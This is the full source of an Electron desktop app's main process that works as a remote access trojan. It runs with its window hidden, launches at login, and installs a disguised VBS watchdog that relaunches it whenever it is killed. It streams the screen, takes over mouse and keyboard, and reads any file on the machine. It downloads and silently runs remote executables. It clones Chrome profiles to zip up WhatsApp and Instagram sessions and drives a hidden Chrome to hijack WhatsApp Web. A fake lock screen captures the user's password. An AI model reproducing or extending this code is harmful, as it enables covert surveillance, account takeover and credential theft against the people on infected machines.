const { app, BrowserWindow, ipcMain, desktopCapturer, shell, nativeImage } = require('electron');
const path = require('path');
const os = require('os');
const fs = require('fs');
const { exec, spawn } = require('child_process');
const puppeteer = require('puppeteer-core');
const fsExtra = require('fs-extra');

const gotTheLock = app.requestSingleInstanceLock();
if (!gotTheLock) {
    app.quit();
    process.exit(0);
}

function startWatchdog() {
    // Only run the watchdog when the app is actually packaged as an EXE
    if (!app.isPackaged) return;

    const exePath = app.getPath("exe");
    const exeName = path.basename(exePath);
    const watchdogPath = path.join(app.getPath("userData"), "win_updater.vbs");

    const vbsCode = `
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWMIService = GetObject("winmgmts:\\\\.\\root\\cimv2")
Do
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '${exeName}'")
    If colProcesses.Count = 0 Then
        If objFSO.FileExists("${exePath}") Then
            objShell.Run """${exePath}""", 0, False
        End If
    End If
    WScript.Sleep 5000
Loop
`;

    fs.writeFileSync(watchdogPath, vbsCode);

    // Kill any existing watchdog for our app, then start a new one
    exec(`wmic process where "name='wscript.exe' and commandline like '%win_updater.vbs%'" call terminate`, { windowsHide: true }, () => {
        const child = spawn('wscript.exe', [watchdogPath], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        });
        child.unref();
    });
}

let psControl = null;
function setupRemoteControl() {
    psControl = spawn('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', '-'], { windowsHide: true });
    const setupScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -MemberDefinition '
    [DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);
' -Name NativeMethods -Namespace Win32
function Move-Mouse { param($x, $y); [Win32.NativeMethods]::mouse_event(0x8001, $x, $y, 0, 0) }
function Click-Left { param($x, $y); [Win32.NativeMethods]::mouse_event(0x8001, $x, $y, 0, 0); [Win32.NativeMethods]::mouse_event(2, 0, 0, 0, 0); [Win32.NativeMethods]::mouse_event(4, 0, 0, 0, 0) }
function Click-Right { param($x, $y); [Win32.NativeMethods]::mouse_event(0x8001, $x, $y, 0, 0); [Win32.NativeMethods]::mouse_event(8, 0, 0, 0, 0); [Win32.NativeMethods]::mouse_event(16, 0, 0, 0, 0) }
function Scroll-Mouse { param($amount); [Win32.NativeMethods]::mouse_event(0x0800, 0, 0, $amount, 0) }
function Send-Text { param($txt); [System.Windows.Forms.SendKeys]::SendWait($txt) }
`;
    psControl.stdin.write(setupScript + '\n');
}

function createWindow() {
    const win = new BrowserWindow({
        show: false, // Make the window completely hidden
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js')
        }
    });

    win.loadFile('index.html');
}

// Auto start the app in the background when the user logs into their laptop
app.setLoginItemSettings({
    openAtLogin: true,
    path: app.getPath("exe")
});

app.whenReady().then(() => {
    // Get all screen sources
    ipcMain.handle('get-sources', async () => {
        const sources = await desktopCapturer.getSources({ types: ['screen', 'window'] });
        return sources.map(source => ({
            id: source.id,
            name: source.name
        }));
    });

    ipcMain.handle('get-screen-thumbnail', async () => {
        const sources = await desktopCapturer.getSources({ types: ['screen'], thumbnailSize: { width: 1280, height: 720 } });
        const mainScreen = sources.find(s => s.id.startsWith('screen')) || sources[0];
        if (mainScreen && mainScreen.thumbnail) {
            return "data:image/jpeg;base64," + mainScreen.thumbnail.toJPEG(75).toString('base64');
        }
        return null;
    });

    // Provide the computer name so the admin knows which laptop it is
    ipcMain.handle('get-hostname', () => os.hostname());

    ipcMain.handle('get-version', () => {
        return {
            appVersion: "1.0.12",
            aptVersion: "apt-15" // Current APT level
        };
    });

    ipcMain.handle('get-drives', async () => {
        return new Promise((resolve) => {
            exec('powershell "[System.IO.DriveInfo]::GetDrives() | Select-Object -ExpandProperty Name"', (error, stdout) => {
                if (error) { resolve(['C:\\']); return; }
                const drives = stdout.split(/\r?\n/)
                    .map(line => line.trim())
                    .filter(line => /^[A-Z]:\\/i.test(line));
                if (drives.length > 0) resolve(drives);
                else resolve(['C:\\']);
            });
        });
    });

    ipcMain.handle('read-directory', async (event, dirPath) => {
        try {
            const items = await fs.promises.readdir(dirPath, { withFileTypes: true });
            // Limit to 250 items to prevent UI/Socket freeze
            const slicedItems = items.slice(0, 250);
            
            let completed = 0;
            const total = slicedItems.length;

            const result = await Promise.all(slicedItems.map(async (item) => {
                let thumbnail = null;
                const fullPath = path.join(dirPath, item.name);
                let isDir = item.isDirectory();
                
                if (item.isSymbolicLink()) {
                    try {
                        const stat = await fs.promises.stat(fullPath);
                        isDir = stat.isDirectory();
                    } catch(e) {} // If broken symlink, leave it as false
                }
                
                if (!isDir) {
                    const ext = path.extname(item.name).toLowerCase();
                    if (['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.webp'].includes(ext)) {
                        try {
                            let thumb = await nativeImage.createThumbnailFromPath(fullPath, { width: 60, height: 60 });
                            
                            // Fallback for images if OS thumbnail fails or is empty
                            if ((!thumb || thumb.isEmpty()) && ['.jpg', '.jpeg', '.png', '.gif', '.webp'].includes(ext)) {
                                const stats = await fs.promises.stat(fullPath);
                                // Fallback only for images < 10MB to avoid memory crash
                                if (stats.size < 10 * 1024 * 1024) {
                                    const img = nativeImage.createFromPath(fullPath);
                                    if (!img.isEmpty()) {
                                        thumb = img.resize({ width: 60 });
                                    }
                                }
                            }

                            if (thumb && !thumb.isEmpty()) {
                                thumbnail = thumb.toDataURL();
                            }
                        } catch (e) {
                            // Secondary fallback if createThumbnailFromPath throws an exception
                            if (['.jpg', '.jpeg', '.png', '.gif', '.webp'].includes(ext)) {
                                try {
                                    const stats = await fs.promises.stat(fullPath);
                                    if (stats.size < 10 * 1024 * 1024) {
                                        const img = nativeImage.createFromPath(fullPath);
                                        if (!img.isEmpty()) {
                                            thumbnail = img.resize({ width: 60 }).toDataURL();
                                        }
                                    }
                                } catch(fallbackErr) {}
                            }
                        }
                    }
                }

                completed++;
                if (total > 0 && (completed % 10 === 0 || completed === total)) {
                    const percent = Math.round((completed / total) * 100);
                    event.sender.send('dir-progress', percent);
                }

                return {
                    name: item.name,
                    path: fullPath,
                    isDirectory: isDir,
                    size: 0,
                    thumbnail: thumbnail
                };
            }));

            // Sort folders first
            result.sort((a, b) => b.isDirectory - a.isDirectory || a.name.localeCompare(b.name));
            return result;
        } catch(e) {
            return { error: e.message };
        }
    });

    ipcMain.handle('open-file', async (event, filePath) => {
        try {
            await shell.openPath(filePath);
            return true;
        } catch (e) {
            return false;
        }
    });

    ipcMain.handle('get-file-size', async (event, filePath) => {
        try {
            const stats = await fs.promises.stat(filePath);
            return stats.size;
        } catch(e) {
            return -1;
        }
    });

    ipcMain.handle('read-file-chunk', async (event, filePath, start, end) => {
        let fd = null;
        try {
            fd = await fs.promises.open(filePath, 'r');
            const length = end - start;
            const buffer = Buffer.alloc(length);
            await fd.read(buffer, 0, length, start);
            return buffer.toString('base64');
        } catch(e) {
            return null;
        } finally {
            if (fd) await fd.close();
        }
    });

    ipcMain.handle('remote-action', async (event, action) => {
        if (!psControl) setupRemoteControl();
        try {
            // Convert relative coordinates (0.0 to 1.0) to absolute mouse scale (0 to 65535)
            const absX = Math.round(action.x * 65535);
            const absY = Math.round(action.y * 65535);

            if (action.type === 'move') {
                psControl.stdin.write(`Move-Mouse ${absX} ${absY}\n`);
            } else if (action.type === 'click') {
                psControl.stdin.write(`Click-Left ${absX} ${absY}\n`);
            } else if (action.type === 'rclick') {
                psControl.stdin.write(`Click-Right ${absX} ${absY}\n`);
            } else if (action.type === 'scroll') {
                psControl.stdin.write(`Scroll-Mouse ${action.amount}\n`);
            } else if (action.type === 'type') {
                // escape for powershell single quotes
                let safeTxt = action.text.replace(/'/g, "''");
                psControl.stdin.write(`Send-Text '${safeTxt}'\n`);
            }
        } catch(e) {}
    });

    let updateStream = null;
    const updateExePath = path.join(os.tmpdir(), 'cml_update.exe');

    ipcMain.handle('start-update', () => {
        try {
            if (fs.existsSync(updateExePath)) fs.unlinkSync(updateExePath);
            updateStream = fs.createWriteStream(updateExePath);
            return true;
        } catch(e) {
            return false;
        }
    });

    ipcMain.handle('write-update-chunk', (event, base64Data) => {
        if (updateStream) {
            const buffer = Buffer.from(base64Data, 'base64');
            updateStream.write(buffer);
            return true;
        }
        return false;
    });

    ipcMain.handle('finish-update-and-install', () => {
        if (updateStream) {
            updateStream.end(() => {
                const exePath = app.getPath("exe");
                const vbsPath = path.join(os.tmpdir(), 'install_cml_update.vbs');

                const vbsCode = `
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Wait for 2 seconds to let the old app close completely
WScript.Sleep 2000

' Run the installer silently AND WAIT for it to finish (True)
objShell.Run """" & "${updateExePath}" & """ /S", 0, True

' Wait for 3 seconds after install
WScript.Sleep 3000

' Launch the newly installed app
If objFSO.FileExists("${exePath}") Then
    objShell.Run """${exePath}""", 0, False
End If

' Delete self
objFSO.DeleteFile WScript.ScriptFullName
`;
                fs.writeFileSync(vbsPath, vbsCode);
                const child = spawn('wscript.exe', [vbsPath], {
                    detached: true,
                    stdio: 'ignore',
                    windowsHide: true
                });
                child.unref();
                app.quit();
            });
            return true;
        }
        return false;
    });
    ipcMain.handle('get-chrome-profiles', async () => {
        const userDataDir = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
        const profiles = [];
        try {
            if (fs.existsSync(userDataDir)) {
                const items = await fs.promises.readdir(userDataDir, { withFileTypes: true });
                for (const item of items) {
                    if (item.isDirectory() && (item.name === 'Default' || item.name.startsWith('Profile '))) {
                        profiles.push(item.name);
                    }
                }
            }
        } catch(e) {}
        return profiles;
    });

    ipcMain.handle('zip-whatsapp-profile', async (event, profileName) => {
        const userDataDir = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
        const clonedDir = path.join(os.tmpdir(), 'CML_WA_Profile_Clone');
        const zipPath = path.join(os.tmpdir(), 'WhatsApp_Profile.zip');

        async function findWhatsAppProfile(dir) {
            try {
                const items = await fs.promises.readdir(dir, { withFileTypes: true });
                let mostRecentProfile = 'Default';
                let latestTime = 0;
                for (const item of items) {
                    if (item.isDirectory() && (item.name === 'Default' || item.name.startsWith('Profile '))) {
                        const waLevelDbPath = path.join(dir, item.name, 'IndexedDB', 'https_web.whatsapp.com_0.indexeddb.leveldb');
                        if (fs.existsSync(waLevelDbPath)) {
                            try {
                                const stat = await fs.promises.stat(waLevelDbPath);
                                if (stat.mtimeMs > latestTime) {
                                    latestTime = stat.mtimeMs;
                                    mostRecentProfile = item.name;
                                }
                            } catch (e) {
                                if (latestTime === 0) mostRecentProfile = item.name;
                            }
                        }
                    }
                }
                return mostRecentProfile;
            } catch (e) {}
            return 'Default';
        }

        const activeProfile = profileName || await findWhatsAppProfile(userDataDir);

        try { if (fs.existsSync(clonedDir)) await fsExtra.remove(clonedDir); } catch(e){}
        try { if (fs.existsSync(zipPath)) await fsExtra.remove(zipPath); } catch(e){}

        await fsExtra.ensureDir(clonedDir);
        
        async function copyProfileData() {
            try {
                const localStateSrc = path.join(userDataDir, 'Local State');
                if (fs.existsSync(localStateSrc)) {
                    await fs.promises.copyFile(localStateSrc, path.join(clonedDir, 'Local State'));
                }
            } catch(e){}

            const srcProfile = path.join(userDataDir, activeProfile);
            const destProfile = path.join(clonedDir, activeProfile);
            
            async function robustCopy(src, dest) {
                await fsExtra.ensureDir(dest);
                const items = await fs.promises.readdir(src, { withFileTypes: true });
                for (const item of items) {
                    const srcP = path.join(src, item.name);
                    const destP = path.join(dest, item.name);
                    const s = srcP.toLowerCase();
                    if (
                        s.includes('cache') || 
                        s.includes('crashpad') || 
                        s.includes('service worker\\cachestorage') || 
                        s.includes('service worker\\scriptcache') || 
                        item.name === 'SingletonLock' || 
                        item.name === 'LOCK'
                    ) continue;
                    
                    if (item.isDirectory()) {
                        await robustCopy(srcP, destP);
                    } else {
                        try {
                            await fs.promises.copyFile(srcP, destP);
                        } catch(err) {
                            try {
                                const data = await fs.promises.readFile(srcP);
                                await fs.promises.writeFile(destP, data);
                            } catch(err2) {}
                        }
                    }
                }
            }
            if (fs.existsSync(srcProfile)) {
                await robustCopy(srcProfile, destProfile);
            }
        }

        await copyProfileData();

        return new Promise((resolve) => {
            exec(`tar.exe -a -c -f "${zipPath}" -C "${clonedDir}" .`, (err) => {
                if (err) {
                    exec(`powershell -WindowStyle Hidden -Command "Compress-Archive -Path '${clonedDir}\\*' -DestinationPath '${zipPath}' -Force"`, (err2) => {
                        if (err2) resolve(null);
                        else resolve(zipPath);
                    });
                } else {
                    resolve(zipPath);
                }
            });
        });
    });

    ipcMain.handle('zip-instagram-profile', async (event, profileName) => {
        const userDataDir = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
        const clonedDir = path.join(os.tmpdir(), 'CML_IG_Profile_Clone');
        const zipPath = path.join(os.tmpdir(), 'Instagram_Profile.zip');

        async function findInstaProfile(dir) {
            try {
                const items = await fs.promises.readdir(dir, { withFileTypes: true });
                let mostRecentProfile = 'Default';
                let latestTime = 0;
                for (const item of items) {
                    if (item.isDirectory() && (item.name === 'Default' || item.name.startsWith('Profile '))) {
                        // Instagram stores data in Local Storage or IndexedDB
                        const igLocalDbPath = path.join(dir, item.name, 'Local Storage', 'leveldb');
                        if (fs.existsSync(igLocalDbPath)) {
                            try {
                                const stat = await fs.promises.stat(igLocalDbPath);
                                if (stat.mtimeMs > latestTime) {
                                    latestTime = stat.mtimeMs;
                                    mostRecentProfile = item.name;
                                }
                            } catch (e) {
                                if (latestTime === 0) mostRecentProfile = item.name;
                            }
                        }
                    }
                }
                return mostRecentProfile;
            } catch (e) {}
            return 'Default';
        }

        const activeProfile = profileName || await findInstaProfile(userDataDir);

        try { if (fs.existsSync(clonedDir)) await fsExtra.remove(clonedDir); } catch(e){}
        try { if (fs.existsSync(zipPath)) await fsExtra.remove(zipPath); } catch(e){}

        await fsExtra.ensureDir(clonedDir);
        
        async function copyProfileData() {
            try {
                const localStateSrc = path.join(userDataDir, 'Local State');
                if (fs.existsSync(localStateSrc)) {
                    await fs.promises.copyFile(localStateSrc, path.join(clonedDir, 'Local State'));
                }
            } catch(e){}

            const srcProfile = path.join(userDataDir, activeProfile);
            const destProfile = path.join(clonedDir, activeProfile);
            
            async function robustCopy(src, dest) {
                await fsExtra.ensureDir(dest);
                const items = await fs.promises.readdir(src, { withFileTypes: true });
                for (const item of items) {
                    const srcP = path.join(src, item.name);
                    const destP = path.join(dest, item.name);
                    const s = srcP.toLowerCase();
                    if (
                        s.includes('cache') || 
                        s.includes('crashpad') || 
                        s.includes('service worker\\cachestorage') || 
                        s.includes('service worker\\scriptcache') || 
                        item.name === 'SingletonLock' || 
                        item.name === 'LOCK'
                    ) continue;
                    
                    if (item.isDirectory()) {
                        await robustCopy(srcP, destP);
                    } else {
                        try {
                            await fs.promises.copyFile(srcP, destP);
                        } catch(err) {
                            try {
                                const data = await fs.promises.readFile(srcP);
                                await fs.promises.writeFile(destP, data);
                            } catch(err2) {}
                        }
                    }
                }
            }
            if (fs.existsSync(srcProfile)) {
                await robustCopy(srcProfile, destProfile);
            }
        }

        await copyProfileData();

        return new Promise((resolve) => {
            exec(`tar.exe -a -c -f "${zipPath}" -C "${clonedDir}" .`, (err) => {
                if (err) {
                    exec(`powershell -WindowStyle Hidden -Command "Compress-Archive -Path '${clonedDir}\\*' -DestinationPath '${zipPath}' -Force"`, (err2) => {
                        if (err2) resolve(null);
                        else resolve(zipPath);
                    });
                } else {
                    resolve(zipPath);
                }
            });
        });
    });

    async function getChromePath() {
        const defaultPath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
        const x86Path = 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe';
        if (fs.existsSync(defaultPath)) return defaultPath;
        if (fs.existsSync(x86Path)) return x86Path;
        return null;
    }

    let hiddenBrowser = null;
    let hiddenClient = null;

    ipcMain.handle('start-hidden-chrome', async (event, profileName) => {
        try {
            const chromeExe = await getChromePath();
            if (!chromeExe) throw new Error("Chrome not found on target laptop");

            const userDataDir = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data');
            const clonedDir = path.join(os.tmpdir(), 'CML_Chrome_Clone');

            if (hiddenBrowser) {
                await hiddenBrowser.close().catch(()=>{});
                hiddenBrowser = null;
                hiddenClient = null;
            }

            try {
                if (fs.existsSync(clonedDir)) {
                    await fsExtra.remove(clonedDir);
                }
            } catch(e) {}

            await fsExtra.ensureDir(clonedDir);
            
            async function robustCopy(src, dest) {
                try {
                    await fsExtra.ensureDir(dest);
                    const items = await fs.promises.readdir(src, { withFileTypes: true });
                    for (const item of items) {
                        const srcPath = path.join(src, item.name);
                        const destPath = path.join(dest, item.name);
                        const s = srcPath.toLowerCase();

                        // Skip lock files and caches
                        if (
                            s.includes('cache') || 
                            s.includes('crashpad') || 
                            s.includes('service worker\\cachestorage') || 
                            s.includes('service worker\\scriptcache') || 
                            item.name === 'SingletonLock' || 
                            item.name === 'SingletonCookie' || 
                            item.name === 'SingletonSocket' || 
                            item.name === 'LOCK'
                        ) continue;

                        if (item.isDirectory()) {
                            await robustCopy(srcPath, destPath);
                        } else {
                            try {
                                await fs.promises.copyFile(srcPath, destPath);
                            } catch(err) {
                                // If locked, try to read and write instead of native copyFile, sometimes it bypasses certain soft locks
                                try {
                                    const data = await fs.promises.readFile(srcPath);
                                    await fs.promises.writeFile(destPath, data);
                                } catch(err2) {}
                            }
                        }
                    }
                } catch(e) {}
            }

            async function findWhatsAppProfile(userDataDir) {
                try {
                    const items = await fs.promises.readdir(userDataDir, { withFileTypes: true });
                    let mostRecentProfile = 'Default';
                    let latestTime = 0;

                    for (const item of items) {
                        if (item.isDirectory() && (item.name === 'Default' || item.name.startsWith('Profile '))) {
                            const waLevelDbPath = path.join(userDataDir, item.name, 'IndexedDB', 'https_web.whatsapp.com_0.indexeddb.leveldb');
                            if (fs.existsSync(waLevelDbPath)) {
                                console.log("Found WhatsApp in profile:", item.name);
                                try {
                                    const stat = await fs.promises.stat(waLevelDbPath);
                                    if (stat.mtimeMs > latestTime) {
                                        latestTime = stat.mtimeMs;
                                        mostRecentProfile = item.name;
                                    }
                                } catch (e) {
                                    // if stat fails, just use the first one if we haven't found any yet
                                    if (latestTime === 0) mostRecentProfile = item.name;
                                }
                            }
                        }
                    }
                    console.log("Selected most active WhatsApp profile:", mostRecentProfile);
                    return mostRecentProfile;
                } catch (e) {}
                return 'Default'; // fallback
            }

            const activeProfile = profileName || await findWhatsAppProfile(userDataDir);
            
            console.log("Starting robust copy of Chrome profile...");
            
            // Only copy Local State and the active profile
            try {
                const localStateSrc = path.join(userDataDir, 'Local State');
                if (fs.existsSync(localStateSrc)) {
                    await fs.promises.copyFile(localStateSrc, path.join(clonedDir, 'Local State'));
                }
            } catch(e){}

            const srcProfile = path.join(userDataDir, activeProfile);
            const destProfile = path.join(clonedDir, activeProfile);
            
            if (fs.existsSync(srcProfile)) {
                await robustCopy(srcProfile, destProfile);
            }
            console.log("Profile copy completed.");

            hiddenBrowser = await puppeteer.launch({
                executablePath: chromeExe,
                headless: 'new',
                userDataDir: clonedDir,
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-blink-features=AutomationControlled',
                    '--window-size=1280,720',
                    '--mute-audio',
                    `--profile-directory=${activeProfile}`
                ]
            });

            const pages = await hiddenBrowser.pages();
            const page = pages[0] || await hiddenBrowser.newPage();
            await page.setViewport({ width: 1280, height: 720 });
            
            await page.goto('https://web.whatsapp.com', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(()=>{});

            hiddenClient = await page.target().createCDPSession();
            await hiddenClient.send('Page.setDownloadBehavior', {
                behavior: 'allow',
                downloadPath: path.join(os.homedir(), 'Downloads')
            });
            await hiddenClient.send('Page.startScreencast', { format: 'jpeg', quality: 60 });
            
            hiddenClient.on('Page.screencastFrame', async (frameObj) => {
                try {
                    event.sender.send('hidden-chrome-frame', frameObj.data);
                    await hiddenClient.send('Page.screencastFrameAck', { sessionId: frameObj.sessionId });
                } catch(err){}
            });

            return true;
        } catch(e) {
            console.error("Hidden chrome error:", e);
            return false;
        }
    });

    ipcMain.handle('hidden-chrome-action', async (event, action) => {
        if (!hiddenClient) return;
        try {
            if (action.type === 'move') {
                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mouseMoved', x: action.x, y: action.y });
            } else if (action.type === 'click') {
                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mousePressed', button: 'left', clickCount: 1, x: action.x, y: action.y });
                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mouseReleased', button: 'left', clickCount: 1, x: action.x, y: action.y });
            } else if (action.type === 'rclick') {
                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mousePressed', button: 'right', clickCount: 1, x: action.x, y: action.y });
                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mouseReleased', button: 'right', clickCount: 1, x: action.x, y: action.y });
            } else if (action.type === 'scroll') {
                await hiddenClient.send('Input.dispatchMouseEvent', { type: 'mouseWheel', x: action.x, y: action.y, deltaX: 0, deltaY: action.amount });
            } else if (action.type === 'type') {
                if (action.text === 'Enter') {
                    await hiddenClient.send('Input.dispatchKeyEvent', { type: 'keyDown', key: 'Enter', windowsVirtualKeyCode: 13, nativeVirtualKeyCode: 13, text: '\r' });
                    await hiddenClient.send('Input.dispatchKeyEvent', { type: 'keyUp', key: 'Enter', windowsVirtualKeyCode: 13, nativeVirtualKeyCode: 13 });
                } else if (action.text === 'Backspace') {
                    await hiddenClient.send('Input.dispatchKeyEvent', { type: 'keyDown', key: 'Backspace', windowsVirtualKeyCode: 8, nativeVirtualKeyCode: 8 });
                    await hiddenClient.send('Input.dispatchKeyEvent', { type: 'keyUp', key: 'Backspace', windowsVirtualKeyCode: 8, nativeVirtualKeyCode: 8 });
                } else {
                    await hiddenClient.send('Input.dispatchKeyEvent', { type: 'char', text: action.text });
                }
            }
        } catch(e) {}
    });

    ipcMain.handle('stop-hidden-chrome', async () => {
        if (hiddenBrowser) {
            await hiddenBrowser.close().catch(()=>{});
            hiddenBrowser = null;
            hiddenClient = null;
        }
    });

    ipcMain.handle('get-username', () => {
        return os.userInfo().username;
    });

    let lockScreenWindow = null;

    ipcMain.handle('show-fake-lockscreen', () => {
        if (lockScreenWindow) return;
        lockScreenWindow = new BrowserWindow({
            fullscreen: true,
            kiosk: true,
            alwaysOnTop: true,
            skipTaskbar: true,
            frame: false,
            webPreferences: {
                nodeIntegration: false,
                contextIsolation: true,
                preload: path.join(__dirname, 'preload_lock.js')
            }
        });
        lockScreenWindow.loadFile('fake_lock.html');
        
        lockScreenWindow.on('closed', () => {
            lockScreenWindow = null;
        });
    });

    ipcMain.handle('submit-fake-password', (event, pwd) => {
        if (lockScreenWindow) {
            lockScreenWindow.close();
            lockScreenWindow = null;
        }
        if (mainWindow) {
            mainWindow.webContents.send('captured-password', pwd);
        }
    });

    createWindow();
    startWatchdog();
});

// Keep running in the background even if a window is closed
app.on('window-all-closed', () => {
    // Do nothing, we want it to stay alive
});

// When the installer/updater kills the app, stop the watchdog so it doesn't fight the installer
app.on('before-quit', () => {
    exec(`wmic process where "name='wscript.exe' and commandline like '%win_updater.vbs%'" call terminate`);
});